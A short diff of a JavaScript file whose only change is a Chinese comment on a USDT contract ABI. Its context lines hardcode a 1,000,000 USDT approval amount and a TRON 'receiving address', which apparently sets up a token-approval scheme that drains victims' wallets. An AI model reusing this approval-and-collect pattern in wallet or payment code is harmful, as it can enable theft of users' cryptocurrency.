@@ -4,7 +4,7 @@ const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
 const receivingAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
 
 const usdtAbi = [
-    // 完整的USDT ABI
+    // USDT合约ABI
     {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
     {"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
